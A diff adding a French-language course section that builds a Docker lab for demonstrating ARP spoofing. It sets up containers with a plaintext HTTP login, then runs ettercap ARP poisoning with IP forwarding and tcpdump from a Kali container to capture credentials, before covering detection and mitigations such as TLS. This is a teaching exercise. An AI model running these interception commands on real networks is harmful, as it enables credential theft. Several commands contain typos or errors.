@@ -1342,7 +1342,260 @@ CMD ["nginx", "-g", "daemon off;"]</code></pre>
                 </article>
                 <article>
                     <h2 id="creation_environnement_pentest_Docker">Création d'un environnement de pentest avec Docker :</h2>
-                    <p></p>
+                    <h3>Introduction :</h3>
+                    <p>L'objectif de ce cours est de fournir une compréhension complète des attaques d'usurpation d'identité ARP (ARP spoofing) dans un environnement réseau Docker. Nous explorerons les vulnérabilités associées à l'utilisation de protocoles non sécurisés et démontrerons les risques potentiels qu'ils posent pour la sécurité du réseau.</p>
+                    <p class="em">Comment fonctionne l'ARP (Address Resolution Protocol) ?</p>
+                    <h3>Protocole ARP :</h3>
+                    <ul>
+                        <li>
+                            <p>Au niveau de la couche 3 (couche réseau), la plupart des programmes informatiques ou des applications utilisent des adresses logiques (adresses IP) pour envoyer et recevoir des messages.</p>
+                        </li>
+                        <li>
+                            <p>Cependant, la communication réelle a lieu au niveau de la couche 2 (couche liaison de données) à l'aide d'adresses physiques (adresses MAC).</p>
+                        </li>
+                    </ul>
+                    <p>Pour faciliter cette communication, l'adresse MAC de destination doit être déterminée pour permettre aux appareils de se connecter. C'est là qu'ARP (Address Resolution Protocol) entre en jeu; son rôle est de traduire les adresses IP (couche 3) en adresses MAC correspondantes (couche 2).</p>
+                    <h3>Table ARP :</h3>
+                    <p>Une fois l'adresse MAC obtenue, elle est stockée dans la table ARP, qui fait office de liste de contacts.</p>
+                    <p>Tout comme une liste de contacts téléphoniques associe des noms à des numéros de téléphone, la table ARP associe les adresses IP à leurs adresses MAC correspondantes, permettant une référence rapide dans les communications futures.</p>
+                    <img src="../images/ARP_table.PNG" alt="">
+                    <h3>Rappel : protocole ARP :</h3>
+                    <div>
+                        <img src="../images/ARP_spoofing_attack.PNG" alt="" class="float_right">
+                        <p>Lors d'une spoofing attack ARP, l'attaquant incite les appareils du réseau à associer leur propre adresse MAC à l'adresse IP d'un autre appareil. Cette tromperie permet à l'attaquant d'intercepter, de modifier ou de bloquer les communications destinées à cette adresse IP, tout comme il pourrait le faire avec le contact téléphonique.</p>
+                    </div>
+                    <p class="em">Où est le danger ?</p>
+                    <h3>Couche 1 : sniffing :</h3>
+                    <div>
+                        <img src="../images/software_wireshark.PNG" alt="" class="float_right">
+                        <p>Logiciel (Wireshark) ou matériel</p>
+                    </div>
+                    <h3>Couche 7 : HTTP :</h3>
+                    <p>Le protocole HTTP contrôle la façon dont le client formule ses demandes et la façon dont le serveur y répond. Le protocole HTTP connaît différentes méthodes de requêtes. Plus de détails lors des prochains cours.</p>
+                    <p>Le protocole n'offre aucune sécurité de communication. En effet, les informations sont transmises "en clair" sur Internet. Ce qui veut dire qu'il est possible pour un pirate informatique de récolter des informations confidentielles.</p>
+                    <h3>Type de Docker Network (driver) :</h3>
+                    <p>Docker fournit plusieurs pilotes réseau intégrés, chacun répondant à différents besoins réseau pour les conteneurs :</p>
+                    <ul>
+                        <li>
+                            <p><span class="em">bridge</span> : le pilote réseau par défaut. Il crée un réseau interne privé sur l'hôte Docker, permettant aux conteneurs du même hôte de communiquer entre eux.</p>
+                        </li>
+                        <li>
+                            <p><span class="em">host</span> : supprime l'isolation réseau entr eun conteneur et l'hôte Docker. Le conteneur partage la pile réseau de l'hôte, ce qui donne l'impression que le conteneur s'exécute directement sur l'hôte.</p>
+                        </li>
+                        <li>
+                            <p><span class="em">none</span> : isole complètement un conteneur de tous les réseaux. Il ne fournit aucune interface réseau, coupant ainsi toute communication externe.</p>
+                        </li>
+                        <li>
+                            <p><span class="em">overlay</span> : connecte plusieurs démons Docker (hôtes) pour former un seul réseau virtuel. Ceci est utile pour le clustering ou lorsque les conteneurs doivent communiquer entre différents hôtes.</p>
+                        </li>
+                        <li>
+                            <p><span class="em">ipvlan</span> : offre plus de contrôle sur le trafic réseau en vous permettant d'attribuer des adresses IPv4 et IPv6 directement aux conteneurs, sans dépendre de la gestion réseau interne de Docker.</p>
+                        </li>
+                        <li>
+                            <p><span class="em">macvlan</span> : attribue une adresse MAC unique à chaque conteneur, le faisant apparaître comme un périphérique physique distinct sur le réseau, ce qui peut être utile lorsque les conteneurs doivent être directement connectés.</p>
+                        </li>
+                    </ul>
+                    <h3>Network : bridge :</h3>
+                    <div>
+                        <img src="../images/network_bridge.PNG" alt="" class="float_right">
+                        <p>C'est le pilote réseau par défaut. Il crée un réseau interne privé sur l'hôte Docker, permettant aux conteneurs sur le même hôte de communiquer les uns avec les autres.</p>
+                    </div>
+                    <h3>Lab : Docker Network :</h3>
+                    <ul>
+                        <li>
+                            <p>Créez un nouveau réseau nommé "lab" à l'aide du pilote "bridge" :</p>
+<pre><code>docker network create --driver bridge lab</code></pre>
+                        </li>
+                        <li>
+                            <p>Listez tous les réseaux disponibles sur l'hôte Docker :</p>
+<pre><code>docker network list</code></pre>
+                        </li>
+                    </ul>
+                    <img src="../images/docker_network.PNG" alt="">
+                    <h3>Lab : ajouter un client au réseau :</h3>
+                    <p>Ajoutez deux conteneurs Docker, nommés client1 et client2 dans le réseau "lab".</p>
+                    <ul>
+                        <li>
+<pre><code>docker run -dit --name client1 --network lab alpine sh</code></pre>
+                        </li>
+                        <li>
+<pre><code>docker run -dit --name client2 --network lab alpine sh</code></pre>
+                        </li>
+                        <li>
+                            <p><span class="em">-i</span> : permet une saisie interactive (rester debout)</p>
+                        </li>
+                        <li>
+                            <p><span class="em">-d</span>: mode détaché</p>
+                        </li>
+                        <li>
+                            <p><span class="em">-t</span> : alloue un pseudo-TTY (une interface de terminal)</p>
+                        </li>
+                    </ul>
+                    <img src="../images/docker_network_1.PNG" alt="">
+                    <h3>Lab : ping client2 depuis client1 :</h3>
+                    <p>Il faut deux terminaux avec "client1" et "client2" en exécutant la commande suivante selon la victime :</p>
+<pre><code>docker exec -it client1 sh</code></pre>
+<pre><code>docker exec -it client2 sh</code></pre>
+                    <ul>
+                        <li>
+                            <p>Trouver les adresses IP des clients :</p>
+<pre><code>ifconfig</code></pre>
+                        </li>
+                        <li>
+                            <p>Exécuter le ping :</p>
+                            <p>Dans le terminal "client1" :</p>
+<pre><code>ping 172.19.0.3</code></pre>
+                            <p>Dans le terminal "client2" :</p>
+<pre><code>ping 172.19.0.2</code></pre>
+                        </li>
+                        <li>
+                            <p>Vérifier les tables ARP :</p>
+<pre><code>arp -a</code></pre>
+                        </li>
+                    </ul>
+                    <h3>Lab : ajouter un serveur HTTp dans le conteneur client 2 :</h3>
+                    <ul>
+                        <li>
+                            <p>ajouter une application Web</p>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "client2" :</p>
+<pre><code>apk add --no-cache python3 py3-pip</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "client2" :</p>
+<pre><code>vim app.py</code></pre>
+                            <p>Le fichier `<span class="em">app.py</span>` est :</p>
+<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse as urlparse
+ 
+class AuthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Parse the path
+        parsed_path = urlparse.urlparse(self.path)
+        # Root endpoint ("/") that returns "Hello, World!"
+        if parsed_path.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(b"Hello, World!\n")
+        # Auth endpoint ("/auth") that checks user and password
+        elif parsed_path.path == '/auth':
+            # Parse query parameters
+            query_components = urlparse.parse_qs(parsed_path.query)
+            # Get the 'user' and 'password' parameters
+            user = query_components.get('user', [None])[0]
+            password = query_components.get('password', [None])[0]
+            # Check if credentials match
+            if user == 'root' and password == 'root':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/plain')
+                self.end_headers()
+                self.wfile.write(b"connected\n")
+            else:
+                self.send_response(403)
+                self.send_header('Content-type', 'text/plain')
+                self.end_headers()
+                self.wfile.write(b"forbidden\n")
+        # Handle other paths
+        else:
+            self.send_response(404)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(b"Not Found\n")
+ 
+# Set up and start the server
+server_address = ('', 8080)
+httpd = HTTPServer(server_address, AuthHandler)
+print("Serving on port 8080...")
+httpd.serve_forever()</code></pre>
+                            <p>Pour quitter, il faut taper la commande <span class="em">:wq!</span>.</p>
+<pre><code>python app.py</code></pre>
+                            <p>Cette commande affichera la ligne suivante dans le terminal :</p>
+<pre><code>Serving on port 8080...</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "client1" :</p>
+<pre><code>apk add curl</code></pre>
+<pre><code>curl "http://172.19.0.3:8080/auth?user=root&amp;password=root"</code></pre>
+                        </li>
+                    </ul>
+                    <img src="../images/docker_network_1.PNG" alt="">
+                    <h3>ARP spoofing :</h3>
+                    <ul>
+                        <li>
+                            <p>Dans le 3<sup>ème</sup> terminal nommé "attacker" :</p>
+<pre><code>apt-get update</code></pre>
+<pre><code>docker run -dit --privileged --name attacker --network lab kalilinux/kali-rolling sh</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "attacker" :</p>
+<pre><code>apt-get install ettercap-text-only</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "attacker" :</p>
+<pre><code>apt install net-tols</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "attacker" :</p>
+<pre><code>ettercap -T -q -i eth0 -M arp:remote /172.19.0.2// /172.19.0.2//</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans un 4<sup>ème</sup> terminal nommé "attacker2" :</p>
+<pre><code>docker exec -it attacker sh</code></pre>
+<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "attacker2" :</p>
+<pre><code>tcpdump -i eth0 -n -c 20</code></pre>
+                            <img src="../images/docker_network_2.PNG" alt="">
+                        </li>
+                        <li>
+                            <p>Exécuter <span class="em">arp -a</span> dans le terminal "client1" et "client2"</p>
+                        </li>
+                        <li>
+                            <p>Dans le terminal "client1" :</p>
+<pre><code>curl "http://172.19.0.3:8080/auth?user=root&amp;password=root"</code></pre>
+                        </li>
+                        <li>
+                            <p>Vérifier le résultat :</p>
+                            <p>Dans le terminal "attacker", on voit qu'il a récupéré le USER et le PASSWORD.</p>
+                        </li>
+                    </ul>
+                    <h3>Comment détecter le problème ?</h3>
+                    <p>Il vous suffit de vérifier votre table ARP (commande `<span class="em">arp -a</span>`).</p>
+                    <p>Vous êtes victime de l'attaque dans le cas où la table affiche deux adresses IP ayant la même adresse MAC.</p>
+                    <h3>Comment traiter le problème ?</h3>
+                    <ul>
+                        <li>
+                            <p>Tables ARP statiques</p>
+                        </li>
+                        <li>
+                            <p>Sécuriser switch (Dynamic ARP Inspection)</p>
+                        </li>
+                        <li>
+                            <p>Isolation du réseau</p>
+                        </li>
+                        <li>
+                            <p>Chiffrement</p>
+                        </li>
+                    </ul>
+                    <h3>Switch à TLS :</h3>
+                    <ul>
+                        <li>
+                            <p>Générer des certificats</p>
+                        </li>
+                        <li>
+                            <p>Adapter l'application</p>
+                        </li>
+                        <li>
+                            <p>Retenter l'attaque</p>
+                        </li>
+                    </ul>
+                    <h3>Ajouter le certificat CA :</h3>
+                    <p>Ajoutez le certicat CA dans le client :</p>
+<pre><code>apk add ca-certificates cp ca.crt /usr/local/share/ca-certifcates/ca.crt</code></pre>
+<pre><code>sudo update-ca-certificates</code></pre>
                 </article>
             <!-- fin de section -->
             </section>
